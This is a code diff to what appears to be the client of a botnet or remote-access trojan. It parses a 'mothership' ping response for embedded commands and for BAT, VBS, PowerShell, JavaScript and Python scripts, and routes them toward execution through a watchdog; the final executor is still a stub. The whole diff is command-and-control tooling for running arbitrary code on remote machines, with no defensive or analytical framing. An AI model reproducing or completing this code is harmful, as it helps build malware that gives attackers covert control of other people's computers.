@@ -953,8 +953,69 @@ function validatePingResponse(pingresponse) {
     return false;
 }
 
+function extractText(rawtext, begintoken, endtoken) {
+    let token_start = rawtext.indexOf(begintoken);
+    let token_end = rawtext.indexOf(endtoken);
+    let cmdstr = '';
+
+    if ( ( token_start >= 0 ) && ( token_end > token_start ) ) {
+        cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
+    }
+
+    return cmdstr;
+}
+
 function processClientJob(rawtext) {
     let clientjob = null;
+
+    if ( rawtext.includes('execute_cmdlist') ) {
+        clientjob = {
+            jobtype: 'execute_cmdlist',
+            jobcode: ''
+        }
+
+        return clientjob;
+    }
+
+    let jobcode = extractText(rawtext, 'JOBCODE_BEGIN', 'JOBCODE_END'); 
+
+    let begintoken = 'EXEC_CMD_BEGIN';
+    let endtoken = 'EXEC_CMD_END';
+    let cmdstr = extractText(rawtext, begintoken, endtoken);
+
+    if ( ! isNullOrWhitespace(cmdstr) ) {
+        let parts = cmdstr.split('|');
+        parts = parts.filter(item => ! isNullOrWhitespace(item));
+
+        if ( parts.length >= 1 ) {
+            let clientjob = {
+                jobtype: 'EXEC_CMD',
+                jobcode: jobcode,
+                cmdname: parts[0],
+                args: parts.length > 1 ? parts.slice(1) : []
+            };
+
+            return clientjob;
+        }
+    }
+
+    let tokens = [ 'BAT', 'VBS', 'PS1', 'JS', 'PY' ];
+
+    for ( let i=0; i<tokens.length; i++) {
+        let token = tokens[i];
+
+        let scripttext = extractText(rawtext, 'EXEC_'+token+'_BEGIN','EXEC_'+token+'_END');
+
+        if ( ! isNullOrWhitespace(scripttext) ) {
+            let clientjob = {
+                jobtype: 'EXEC_' + token,
+                jobcode: jobcode,
+                scripttext: scripttext
+            };
+
+            return clientjob;
+        }
+    }
 
     return clientjob;
 }
@@ -978,6 +1039,7 @@ function ping() {
         let isvalid = validatePingResponse(pingresponse);
 
         if ( ! isvalid ) {
+            logmsg('ping response is invalid');
             systemstate.selectMothership();
             return;
         }
@@ -987,13 +1049,18 @@ function ping() {
         let clientjob = processClientJob(rawtext);
 
         if ( clientjob ) {
-            // TODO: clientjob.execute();
+            logmsg('executing client job: jobcode='+clientjob.jobcode+' job type: '+clientjob.jobtype);
+            executeJob(clientjob);
         }
     };
 
     cmdconfig.loop();
 
     logmsg('finished');
+}
+
+function executeJob(clientjob) {
+    // send message to watchdog to queue job with cmdlist for execution
 }
 
 function cmdlist() {
